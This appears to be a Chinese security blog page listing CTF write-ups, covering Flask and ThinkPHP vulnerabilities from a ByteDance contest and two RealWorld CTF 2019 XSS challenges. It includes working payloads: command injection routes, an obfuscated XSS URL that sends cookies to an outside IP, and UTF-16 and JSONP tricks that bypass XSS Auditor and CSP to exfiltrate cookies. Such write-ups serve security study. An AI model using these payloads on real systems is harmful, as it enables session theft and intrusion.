<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/" target="_blank" rel="noopener">Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)</a><br><a href="http://cnode1.rssing.com/chan-68517434/all_p385.html" target="_blank" rel="noopener">spawn、exec、execFile和fork</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzA4NzA5OTYzNw==&mid=2247483761&idx=1&sn=a366c51bd57b4fead862d11616a10b19&chksm=903fd0eba74859fd6ba296e29bf600a1004eeed72de3fb433c74d47654ce37a435e6d1e2742c&mpshare=1&scene=1&srcid=&sharer_sharetime=1571588210071&sharer_shareid=3674d5df50965fb924ba35f64042cb57&key=a2eb8c0b2340b20d3581c0a15949a693ac0879f7879b201f3878bc1f796bf6e8225380e8c186fbea7a3f5abb3c67841d7f71500c9619d916c3ced85f20b5d9cefdb3980e259d7e0c59132aada59c4132&ascene=1&uin=MTMyNzEzMTk2NQ%3D%3D&devicetype=Windows+10&version=62070152&lang=zh_CN&pass_ticket=866ICVsXH4EG%2FSMhWF45HLNA4E5jKkn%2Fh4V6bsGMzepRRdEW4YsHhfvV84kkAfIA" target="_blank" rel="noopener">Kibana漏洞之javascript原型链污染</a></p>

                
            </div>
            <div class="continue">
            <a href="/2019/11/20/从Kibana-RCE对nodejs子进程创建的思考/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/10/20/字节跳动CTF线下赛Web题解&复盘/"> 
                    字节跳动CTF线下赛Web题解&amp;复盘 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-10-20   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AWD/">AWD</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="字节跳动CTF线下赛Web题解-amp-复盘"><a href="#字节跳动CTF线下赛Web题解-amp-复盘" class="headerlink" title="字节跳动CTF线下赛Web题解&amp;复盘"></a>字节跳动CTF线下赛Web题解&amp;复盘</h1><h1 id="PythonWeb"><a href="#PythonWeb" class="headerlink" title="PythonWeb"></a>PythonWeb</h1><h2 id="做题小谈"><a href="#做题小谈" class="headerlink" title="做题小谈"></a>做题小谈</h2><p>之前线下赛没运维过pythonweb，踩了很多坑，小记一下。</p>
<p>flask在更改代码后要重启才能生效，但是如果<code>app.DEBUG=True</code>则不需要重启flask，这个配置多见于<code>config.py</code>，比赛的时候也可以全局搜索。</p>
<p>目录结构如下<br><img src="http://static.zybuluo.com/1160307775/44a650nlxazo4hlxfio2jpd6/image_1dnm2lc67dmv18gg4fn1d95fq5m.png" alt="image_1dnm2lc67dmv18gg4fn1d95fq5m.png-112.2kB"></p>
<p>在pyweb的awd中，<strong>一定要先<code>ps -ef</code>看一下系统的进程，看看原始的服务是怎么启动的，我们就可以照着它的命令去重启flask</strong>，而不至于把服务启崩。这次我就是没有看进程，自己相当然的用命令<code>flask run</code>，结果被down了好几轮。</p>
<p>最后看了下手册，这里pyweb使用gunicorn来启动的：</p>
<pre><code>gunicorn -b 0.0.0.0:5000  manage:app</code></pre><h2 id="漏洞审计"><a href="#漏洞审计" class="headerlink" title="漏洞审计"></a>漏洞审计</h2><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><pre><code>@main.route(&#39;/file&#39;)
def file():
    file = request.args.get(&#39;file&#39;,base64.b64encode(&#39;/tmp/Blog_mini/app/static/images/background.jpg&#39;))
    f = open(base64.b64decode(file),&#39;rb&#39;)
    res = f.read()
    return jsonify({&quot;res&quot;:res})</code></pre><p>request.args.get()获取file参数，如果参数不存在则为<code>base64.b64encode(&#39;/tmp/Blog_mini/app/static/images/background.jpg)</code></p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>后台有一点路由<code>/backup</code>，可以调用popen()，那就可以先注册用户，再去rce。同时这个点应该也可以读取任意文件</p>
<pre><code>@main.route(&#39;/backup&#39;,methods = [&#39;GET&#39;])
@login_required
def backup():
    if request.args.get(&#39;name&#39;):
        shell = &#39;tar -zcf ./&#39;+ request.args.get(&#39;name&#39;) +&#39;.tar.gz ./&#39;
        res = os.popen(shell).read()
        ress = {&quot;res&quot;:res}
        return jsonify(ress)
    else:
        return &quot;param is name! please backup!&quot;</code></pre><p><img src="http://static.zybuluo.com/1160307775/xkcvhk7x2py4e8psnoftecq0/image_1dnm8r3b65901pom16tg12t1c031g.png" alt="image_1dnm8r3b65901pom16tg12t1c031g.png-34.8kB"></p>
<h3 id="模版注入"><a href="#模版注入" class="headerlink" title="模版注入"></a>模版注入</h3><p>这个点我没挖到，但是后来听别的师傅说存在404的ssti</p>
<pre><code>@main.app_errorhandler(404)
def page_not_found(e):
    for x in request.path:
        if x in &#39;._%&#39;:
            return render_template(&#39;404.html&#39;), 404
    template = &#39;&#39;&#39;
{%% block body %%}
    &lt;div class=&quot;center-content error&quot;&gt;
        &lt;h1&gt;Oops! That page doesn&#39;t exist in this Blog.&lt;/h1&gt;
        &lt;h3&gt;%s&lt;/h3&gt;
    &lt;/div&gt;
{%% endblock %%}
&#39;&#39;&#39; % (request.url)
    return render_template_string(template), 404</code></pre><p>过滤了<code>._%</code>，下面的ssti是经典的漏洞案例。利用<code>|</code>过滤器和动态传参就可以bypass了，跟今年护网杯的题目思路差不多，这里盗用一下@Smile师傅的payload</p>
<p><img src="http://static.zybuluo.com/1160307775/0ag6778ky7rmn2p6hbxeolyy/image_1dnp66nft9tm243119nifpt49.png" alt="image_1dnp66nft9tm243119nifpt49.png-91.2kB"></p>
<h2 id="流量记录"><a href="#流量记录" class="headerlink" title="流量记录"></a>流量记录</h2><p>这次还是吃了没流量的亏，测试了一下别人的py流量脚本，这里贴出来</p>
<pre><code>@main.before_request
def awdlog():
    import time
    f = open(&#39;/tmp/pylog.txt&#39;,&#39;a+&#39;)
    f.writelines(time.strftime(&#39;%Y-%m-%d %H:%M:%S\n&#39;, time.localtime(time.time())))
    f.writelines(&quot;{method} {url} \n&quot;.format(method=request.method,url=request.url))
    s = &#39;&#39;
    for d,v in dict(request.headers).items():
        s += &quot;%s: %s\n&quot;%(d,v)
    f.writelines(s+&#39;\n&#39;)
    s = &#39;&#39;
    for d,v in dict(request.form).items():
        s += &quot;%s=%s&amp;&quot;%(d,v)
    f.writelines(s.strip(&quot;&amp;&quot;))
    f.writelines(&#39;\n\n&#39;)
    f.close()</code></pre><p><strong>main</strong>指的是应用名，每次根据实际情况更改，最终在/tmp下生成日志<br><img src="http://static.zybuluo.com/1160307775/4ly8u0z2pqen24kyzhml5qt1/image_1dnn61c77p61mvu1v011ini1qtt7e.png" alt="image_1dnn61c77p61mvu1v011ini1qtt7e.png-533.4kB"></p>
<h1 id="Opensns"><a href="#Opensns" class="headerlink" title="Opensns"></a>Opensns</h1><p>基于TP3.2.2开发，比赛复现出两个漏洞。其中一个是内置后门就不说了，还有一个是渲染模版时的任意文件读取漏洞</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="任意文件读取-1"><a href="#任意文件读取-1" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p><code>keywords[_filename]=/flag</code></p>
<p>漏洞点在<code>ThinkPHP/Library/Think/Storage/Driver/File.class.php</code>的File类驱动中，同时File类继承自Storage类：<code>class File extends Storage</code></p>
<p><img src="http://static.zybuluo.com/1160307775/19r0bw8jrs4a14a8r9emc8c6/image_1dnmqjgof1rfhksv1ae71engq2320.png" alt="image_1dnmqjgof1rfhksv1ae71engq2320.png-396.7kB"></p>
<p>在判断了$vars是否存在后，进行了一次变量覆盖，再调用load方法进行了文件包含。追踪一下哪里调用了load方法，发现都是在解析模版的时候调用的，这里选择文件<code>ThinkPHP/ThinkPHP/Library/Think/Template.class.php</code>的fetch()方法</p>
<p><img src="http://static.zybuluo.com/1160307775/qoihow4a22x8pzdf9i9eoxiv/image_1dnmrrf2k138168g9gm12sfoip2t.png" alt="image_1dnmrrf2k138168g9gm12sfoip2t.png-245.5kB"></p>
<p>发现可控参数<code>$templateVar</code>，会被当作实参传入load()，继续寻找调用fetch()方法的位置。因为TP代码中有很多实例化的方法，并不都像<code>storage::</code>这样的调用方式，只能全局搜索fetch看哪里调用。最终发现在<code>ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php</code>中实例化了Template类并且调用fetch()方法。</p>
<p><img src="http://static.zybuluo.com/1160307775/fmsgcdfr846jsn5g71sardnt/image_1dnms90lf1fbckc91cnr18281g1c3a.png" alt="image_1dnms90lf1fbckc91cnr18281g1c3a.png-505.2kB"></p>
<p>刚才说到可控参数<code>$templateVar</code>的原型在这里为<code>$_data</code>，那么<code>$_data</code>是否可控？继续追调用链，在这里追的时候就卡壳了，因为涉及到tp的一个知识：<a href="https://blog.csdn.net/u013927110/article/details/47000379" target="_blank" rel="noopener">Thinkphp下利用钩子使用行为扩展</a></p>
<p>简单来说就在xx文件中，先宏定义了监听器对应的类名再加载进程序(这里的类指的是类似于ParseTemplateBehavior.class.php这种的行为拓展类)<br><img src="http://static.zybuluo.com/1160307775/ab7rmh3hiapj8i4ns6dqrwvi/image_1dnmt4sfa1c6ja0pgb4v00mft4q.png" alt="image_1dnmt4sfa1c6ja0pgb4v00mft4q.png-50.2kB"></p>
<p>而后，程序中的Hook机制通过触发不同类型的监听器，实现对应行为拓展类的实例化且会调用对应行为拓展类的run方法。一个简单的触发机制就是<code>Hook::Listen(tags,prarm)</code>。</p>
<p>那么在这里我们希望它触发<code>view_parse</code>，从而实例化<code>ParseTemplateBehavior</code>。就全局搜索<code>Hook::listen(&#39;view_parse&#39;</code>。在TP的视图类里找到了该监听器的hook<br><img src="http://static.zybuluo.com/1160307775/d7u78w1qao6dkos6xtce62gw/image_1dnmtdrpd6t6101m1omechn1n0857.png" alt="image_1dnmtdrpd6t6101m1omechn1n0857.png-507.6kB"></p>
<p>接下来就好说了，只要<code>$parama</code>可控，并且找到一处能够调用fetch函数的地方，整条利用链就完整了。</p>
<p>其中$param的取值经过一系列的操作</p>
<pre><code>public function assign($name, $value = &#39;&#39;)
{
    if (is_array($name)) {
        $this-&gt;tVar = array_merge($this-&gt;tVar, $name);
    } else {
        $this-&gt;tVar[$name] = $value;
    }
}

$params = array(&#39;var&#39; =&gt; $this-&gt;tVar, &#39;file&#39; =&gt; $templateFile, &#39;content&#39; =&gt; $content, &#39;prefix&#39; =&gt; $prefix);</code></pre><p>file、content、prefix为定值，只有<code>$this-&gt;tvar</code>可操作且被assign函数赋值。这里存在以前tp3的模版rce漏洞的挖掘链，通过assign这个模版赋值函数，赋值变量<code>$this-&gt;tvar</code>。</p>
<p>同时这里还涉及Tp的一个小操作：在tp3.2中，对模版的加载&amp;渲染依靠<code>ThinkPHP/ThinkPHP/Library/Think/View.class.php</code>。先通过View类方法<code>assgin()</code>对模版赋值，再调用<code>display()</code>加载模板和页面输出。在display函数的内部同时实现了<code>fetch()</code>函数解析并获取模板内容，也解决了上面调用fetch函数的困扰。</p>
<p>所以只需要找一个Controller，接受post/get传入参数，并且能够传入<code>assign()</code>去模版赋值，之后再经过tp的<code>display()</code>函数渲染模版，这里出题人在控制器里造了一个方法search，接受keywords参数</p>
<pre><code>public function search()
{
    $keywords=I(&#39;post.keywords&#39;,&#39;&#39;,&#39;text&#39;);

    $modules = D(&#39;Common/Module&#39;)-&gt;getAll();
    foreach ($modules as $m) {
        if ($m[&#39;is_setup&#39;] == 1 &amp;&amp; $m[&#39;entry&#39;] != &#39;&#39;) {
            if (file_exists(APP_PATH . $m[&#39;name&#39;] . &#39;/Widget/SearchWidget.class.php&#39;)) {
                $mod[] = $m[&#39;name&#39;];
            }
        }
    }
    $show_search = get_kanban_config(&#39;SEARCH&#39;, &#39;enable&#39;, $mod, &#39;Home&#39;);

    $this-&gt;assign($keywords);
    $this-&gt;assign(&#39;showBlocks&#39;, $show_search);
    $this-&gt;display();
}</code></pre><p>构造如下poc本地包含文件，由于开启了ob_start()。<br><img src="http://static.zybuluo.com/1160307775/rxlpeekkh3xij9ql2ltkfr7m/image_1dnn1fspe10st1i4rbe6nt1p6g5k.png" alt="image_1dnn1fspe10st1i4rbe6nt1p6g5k.png-208.2kB"></p>
<p>总结来说，该点漏洞就是加载模版的时候，把本地文件作为模版变量赋值，再渲染到页面。这个在平常的代码审计中也是一个不错的思路，膜出题人。</p>
<h1 id="douchat"><a href="#douchat" class="headerlink" title="douchat"></a>douchat</h1><p>同样使用TP3.2.2开发的</p>
<h2 id="漏洞浮现"><a href="#漏洞浮现" class="headerlink" title="漏洞浮现"></a>漏洞浮现</h2><h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><p>跟opensns类似的漏洞，也是模版的渲染，只不过这次存在content参数，即生成的缓存有效时，加载缓存造成代码注入。由于开启了ob_start()，因此在include的时候代码注入<br><img src="http://static.zybuluo.com/1160307775/rqxm9hrlwxtkdfxn6xznrey2/image_1dnn52qdims3v3217dm1s6ph8f6h.png" alt="image_1dnn52qdims3v3217dm1s6ph8f6h.png-535.2kB"></p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>漏洞文件：/Public/Plugins/webuploader/server/preview.php</p>
<pre><code>$src = file_get_contents(&#39;php://input&#39;);
if (preg_match(&quot;#^data:image/(\w+);base64,(.*)$#&quot;, $src, $matches)) {

    $previewUrl = sprintf(
        &quot;%s://%s%s&quot;,
        isset($_SERVER[&#39;HTTPS&#39;]) &amp;&amp; $_SERVER[&#39;HTTPS&#39;] != &#39;off&#39; ? &#39;https&#39; : &#39;http&#39;,
        $_SERVER[&#39;HTTP_HOST&#39;],
        $_SERVER[&#39;REQUEST_URI&#39;]
    );
    $previewUrl = str_replace(&quot;preview.php&quot;, &quot;&quot;, $previewUrl);


    $base64 = $matches[2];
    $type = $matches[1];
    if ($type === &#39;jpeg&#39;) {
        $type = &#39;jpg&#39;;
    }

    $filename = md5($base64).&quot;.$type&quot;;
    $filePath = $DIR.DIRECTORY_SEPARATOR.$filename;

    if (file_exists($filePath)) {
        die(&#39;{&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;result&quot; : &quot;&#39;.$previewUrl.&#39;preview/&#39;.$filename.&#39;&quot;, &quot;id&quot; : &quot;id&quot;}&#39;);
    } else {
        $data = base64_decode($base64);
        file_put_contents($filePath, $data);
        die(&#39;{&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;result&quot; : &quot;&#39;.$previewUrl.&#39;preview/&#39;.$filename.&#39;&quot;, &quot;id&quot; : &quot;id&quot;}&#39;);
    }

} else {
    die(&#39;{&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;error&quot; : {&quot;code&quot;: 100, &quot;message&quot;: &quot;un recoginized source&quot;}}&#39;);
}</code></pre><p><code>$src</code>可控，通过伪协议控制生成的文件名，然后写入到preview/下并回显出来</p>

                
            </div>
            <div class="continue">
            <a href="/2019/10/20/字节跳动CTF线下赛Web题解&复盘/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/09/24/RealWorld CTF2019 两道XSS-Web题解/"> 
                    RealWorld CTF2019 两道XSS-Web题解 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-09-24   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="RealWorld-CTF2019-两道XSS-Web题解"><a href="#RealWorld-CTF2019-两道XSS-Web题解" class="headerlink" title="RealWorld CTF2019 两道XSS-Web题解"></a>RealWorld CTF2019 两道XSS-Web题解</h1><p>原文首发于安全客:<a href="https://www.anquanke.com/post/id/186707" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186707</a></p>
<h2 id="Mission-Invisible"><a href="#Mission-Invisible" class="headerlink" title="Mission Invisible"></a>Mission Invisible</h2><p>题目上来把代码全部给出来了，一段js并且告诉我们有两个隐藏的点</p>
<pre><code>&lt;script&gt;
    var getUrlParam = function (name) {
        var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;);
        var r = unescape(window.location.search.substr(1)).match(reg);
        if (r != null) return r[2];
        return null;
    }

    function setCookie(name, value) {
        var Days = 30;
        var exp = new Date();
        exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 30);
        document.cookie = name + &quot;=&quot; + value + &quot;;expires=&quot; + exp.toGMTString();
    }

    function getCookie(name) {
        var search = name + &quot;=&quot;
        var offset = document.cookie.indexOf(search)
        if (offset != -1) {
            offset += search.length;
            var end = document.cookie.indexOf(&quot;;&quot;, offset);
            if (end == -1) {
                end = document.cookie.length;
            }
            return unescape(document.cookie.substring(offset, end));
        }
        else return &quot;&quot;;
    }

    function setElement(tag) {
        tag = tag.substring(0, 1);
        var ele = document.createElement(tag)
        var attrs = getCookie(&quot;attrs&quot;).split(&quot;&amp;&quot;);
        for (var i = 0; i &lt; attrs.length; i++) {
            var key = attrs[i].split(&quot;=&quot;)[0];
            var value = attrs[i].split(&quot;=&quot;)[1];
            ele.setAttribute(key, value);
        }
        document.body.appendChild(ele);
    }

    var tag = getUrlParam(&quot;tag&quot;);
    setCookie(&quot;tag&quot;, tag);
    setElement(tag);

&lt;/script&gt;</code></pre><p>重点在这个<code>setElement</code>函数，通过tag.substring(0, 1)创建一个dom事件，然后从cookie种取出attrs属性进行标签属性的赋值。接下来追一下cookie是怎么入库的</p>
<pre><code>var tag = getUrlParam(&quot;tag&quot;);
setCookie(&quot;tag&quot;, tag);</code></pre><p>追到函数不难发现是tag传参进去的，并且在<code>getcookie</code>函数中只截取了”attrs=”的后面的值，那么我们就可以在value里插入attrs的值。</p>
<p><img src="http://static.zybuluo.com/1160307775/8nnawoe6cckqbj8v45i7u28p/image_1dksu3lma1sdcaodk0j19g11tn213.png" alt="image_1dksu3lma1sdcaodk0j19g11tn213.png-115.9kB"></p>
<p>所以现在的难点就在于怎么构造一个标签，在浏览器解析的时候自动触发XSS。由于<code>tag = tag.substring(0, 1);</code>这段代码，使得我们现在能用的标签只有a、p。</p>
<p>最初我的想法是污染原型链，在循环遍历attrs的时候：</p>
<pre><code>第一次key = __proto__.ele  &amp; value = document.createElement(“script”)

第二次 key = src  &amp; value = evil.com</code></pre><p>但是尝试了一下发现这样并不能够成功污染，因为我们已经定义了ele这个变量。那只能从a、p标签下手，这里@LFY师傅想到一个很好的方法</p>
<p><img src="http://static.zybuluo.com/1160307775/qxend2mls2etcgiz0das8h9z/image_1dksuhiqvuci17tssl8o111eh720.png" alt="image_1dksuhiqvuci17tssl8o111eh720.png-97.5kB"></p>
<pre><code>&lt;p onfocus=&quot;alert(document.cookie)&quot; id=&quot;1&quot; tabindex=&quot;0&quot;&gt;&lt;/p&gt;</code></pre><p>我们可以通过tableindex使标签可聚焦，只需要在url后面跟一个锚点指向标签id，类似于<code>#1</code>，这样聚焦时触发onfocus，效果就等效于自动触发xss。</p>
<pre><code>http://52.52.236.217:16401/?tag=a%3d1attrs%3donmouserover%3d1%2526onfocus%3dalert(1)%2526id%3d1%2526tabindex%3d0#1</code></pre><p><img src="http://static.zybuluo.com/1160307775/guipvs8t8hxfv0rxvm7hvjse/image_1dksundi8iu3lrfhnnpkunra2d.png" alt="image_1dksundi8iu3lrfhnnpkunra2d.png-249.6kB"></p>
<p>接着就是常规打cookie到本地</p>
<pre><code>http://52.52.236.217:16401/?tag=a=attrs=onmouseover=1%2526onfocus=eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,61,39,104,116,116,112,58,47,47,49,51,57,46,49,57,57,46,50,48,51,46,50,53,51,58,49,50,51,52,47,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))%2526id=1%2526tabindex=0#1</code></pre><h2 id="Hcorme"><a href="#Hcorme" class="headerlink" title="Hcorme"></a>Hcorme</h2><h3 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h3><p>首先题目有一个callback的接口，能够把请求参数输出，并且是text/html形式。这点其实在日常的web应用种并不多见，大多数callback的mime都是javascript</p>
<p><img src="http://static.zybuluo.com/1160307775/ieklsfj1adpr8wcyfwcp6k29/image_1dkseq56a1q3f111911ftas01les9.png" alt="image_1dkseq56a1q3f111911ftas01les9.png-111.3kB"></p>
<p>于此同时题目有两个难点需要bypass：</p>
<ul>
<li>XSS Auditor的限制<br><img src="http://static.zybuluo.com/1160307775/i0q4o5jr15jip56ufv4qbx5b/image_1dksf8oneelujp2n651k3a1qbu13.png" alt="image_1dksf8oneelujp2n651k3a1qbu13.png-183.7kB"></li>
</ul>
<ul>
<li>CSP的限制<pre><code>Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;</code></pre></li>
</ul>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>先着眼xss auditor这个点，在Chrome78以后XSS-Auditor被Chrome自家砍掉了，虽然auditor曾是不少xsser在面对反射性XSS时候的难题，但随着bypass的方法也日益增多，auditor的弊远远大于利：因为auditor在触发的时候会删除恶意输入，之前我博客中有一篇文章<a href="https://hpdoger.cn/2019/07/02/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/">前端全局变量劫持</a>，就能够利用Auditor达到变量劫持的目的。</p>
<p>于此同时Bypass auditor也算是出题人给我们的Hint。</p>
<p>当时我的思路是用字符集去bypass，也就是下面这种思路<br><img src="http://static.zybuluo.com/1160307775/urr4wey9p4wqrnt88qknu6el/image_1dksffho3ttit161ctftckbo61g.png" alt="image_1dksffho3ttit161ctftckbo61g.png-62.5kB"></p>
<p>因为auditor的核心思路就是拿浏览器的渲染和我们的输入做比较，不相符则不会被Check。不过chrome77已经不存在iso-2022-jp这种绕过的方法。接下来我们看一下Hardold师傅的思路–&gt;<strong>utf-16编码绕过</strong></p>
<p>这里串一个编码的知识点，通常我们看到%xx%xx这类的url编码，其实是用16进制表示的，比如utf-8编码形式如下</p>
<pre><code>&gt;&gt;&gt; from urllib.parse import quote,unquote
&gt;&gt;&gt; print(quote((&#39;猪&#39;).encode(&#39;utf-8&#39;)))
&gt;&gt;&gt; %E7%8C%AA</code></pre><p>那么”猪”这个字在utf-8编码下就是<code>0xe7 0x8c 0xaa</code>，下面我们来看一下utf-16编码下的”猪”怎么表示</p>
<pre><code>&gt;&gt;&gt; from urllib.parse import quote,unquote
&gt;&gt;&gt; print(quote((&#39;猪&#39;).encode(&#39;utf-16&#39;)))
&gt;&gt;&gt; %FF%FE%2As</code></pre><p>这时会发现，用utf-16无论编码什么字符，前两个字节都是``0xff0xfe`<br><img src="http://static.zybuluo.com/1160307775/hw1p5epypji3hs4ceofrjada/image_1dksl9ssig0pv2l1f171qr31c5q1t.png" alt="image_1dksl9ssig0pv2l1f171qr31c5q1t.png-98.4kB"></p>
<p>因为在UTF-16文件的开首，都会放置一个U+FEFF字符作为Byte Order Mark（UTF-16LE以FF FE代表，UTF-16BE以FE FF代表），以显示这个文本文件是以UTF-16编码，它是个没有宽度也没有断字的空白。</p>
<p>此时我们来尝试一下能否Bypass XSS Auditor</p>
<pre><code>&gt;&gt;&gt; print(quote((&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;).encode(&#39;utf-16&#39;)))

%FF%FE%3C%00s%00c%00r%00i%00p%00t%00%3E%00a%00l%00e%00r%00t%00%28%001%00%29%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><p><img src="http://static.zybuluo.com/1160307775/wosh7er7qz9zoevz5m9lv3tx/image_1dksm95e81qka1ts9meii2m1cd92q.png" alt="image_1dksm95e81qka1ts9meii2m1cd92q.png-227.5kB"></p>
<p>成功插入标签，接下来到了第二步，Bypass CSP。因为锁了default-src又没有给unsafe-inline，但是题目有一个jsonp的点，不难想到今年的那道<a href="https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere" target="_blank" rel="noopener">ins’hack 2019/的bypasses-everywhere</a></p>
<p>这篇文章的大意相当于利用jsonp直接把js代码”挂载”到本地的script标签里面，从而导致的bypass。那么我们编写一个demo看看</p>
<pre><code>&gt;&gt;&gt; print(quote((&#39;&lt;script/src=?callback=alert(1)&gt;&lt;/script&gt;&#39;).encode(&#39;utf-16&#39;)))

%FF%FE%3C%00s%00c%00r%00i%00p%00t%00/%00s%00r%00c%00%3D%00%3F%00c%00a%00l%00l%00b%00a%00c%00k%00%3D%00a%00l%00e%00r%00t%00%28%001%00%29%00%3E%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><p>可以看到进行了两次资源请求，第二次的资源的执行类型是script<br><img src="http://static.zybuluo.com/1160307775/jo3855qgvjiy2kl23v5m050f/image_1dkssc09a13h01mnh8561rft1g0u9.png" alt="image_1dkssc09a13h01mnh8561rft1g0u9.png-154.8kB"></p>
<p>接着就是把flag打到自己的本地就行了</p>
<pre><code>&gt;&gt;&gt; print(quote((&quot;&lt;script/src=?callback=window.location=&#39;http://xxx/?&#39;%2bdocument.cookie%0a//&gt;&lt;/script&gt;&quot;).encode(&#39;utf-16&#39;)))

%FF%FE%3C%00s%00c%00r%00i%00p%00t%00/%00s%00r%00c%00%3D%00%3F%00c%00a%00l%00l%00b%00a%00c%00k%00%3D%00w%00i%00n%00d%00o%00w%00.%00l%00o%00c%00a%00t%00i%00o%00n%00%3D%00%27%00h%00t%00t%00p%00%3A%00/%00/%00x%00x%00x%00/%00%3F%00%27%00%25%002%00b%00d%00o%00c%00u%00m%00e%00n%00t%00.%00c%00o%00o%00k%00i%00e%00%25%000%00a%00/%00/%00%3E%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><h2 id="比赛总结"><a href="#比赛总结" class="headerlink" title="比赛总结"></a>比赛总结</h2><p>赛题质量真心高，膜Harlold师傅，日常拿0day打比赛..orz</p>

                
            </div>
            <div class="continue">
            <a href="/2019/09/24/RealWorld CTF2019 两道XSS-Web题解/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/09/17/从一道CTF学习Fastcgi绕过姿势/"> 
                    从一道CTF学习Fastcgi绕过姿势 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-09-17   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="从一道CTF学习Fastcgi绕过姿势"><a href="#从一道CTF学习Fastcgi绕过姿势" class="headerlink" title="从一道CTF学习Fastcgi绕过姿势"></a>从一道CTF学习Fastcgi绕过姿势</h1><p>原文首发于安全客:<a href="https://www.anquanke.com/post/id/186186" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186186</a></p>
<p>周末做了一个字节跳动的CTF比赛，其中blog这道题涉及到了disable_functions和open_basedir的限制。在0CTF中出现了类似的考法，给了命令执行点去Bypass Disable_functions&amp;Open_basedir，以前没有做过相关的题，这次记录一下思路和用到的脚本。</p>
<p>关于0CTF的题解，参考飘零师傅：<a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">深入浅出LD_PRELOAD &amp; putenv()</a></p>
<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>当然这题不像0ctf上来就给了你命令执行点，要挖掘一下。简单记一下wp，这部分不细讲。首先是给了全部的源码，在replace.php页面有一个重要功能</p>
<p><img src="http://static.zybuluo.com/1160307775/zojwvlchmoeamdiicqepfg7n/image_1dkak4ebeg8a1e23145e1sbk1pgi3j.png" alt="image_1dkak4ebeg8a1e23145e1sbk1pgi3j.png-429.4kB"></p>
<p>题目的PHP环境是5.3.3所以<code>preg_replace</code>函数是存在一个代码执行的，正好参数又是可控，$replace部分将会被当作php代码执行。</p>
<p>只不过需要先从库里执行这样一句话:<code>$sql-&gt;query(&quot;select isvip from users where id=&quot; . $_SESSION[&#39;id&#39;] . &quot;;&quot;)</code>取校验是否isvip==1，默认注册的所有用户isvip==0。</p>
<p>通过某种方式改变自己的<code>isvip</code>字段，看了下config.php出题人还上了一个waf，直接注入基本不可能。但是它没有过滤SET这个关键词，而且PDO在php5.3以后是支持多条查询的，这给我们堆叠注入创造了机会。<br><img src="http://static.zybuluo.com/1160307775/6cr621hta58y7gic89n0acyf/image_1dkakdh2q164i1hfok7m12koug44g.png" alt="image_1dkakdh2q164i1hfok7m12koug44g.png-440.4kB"></p>
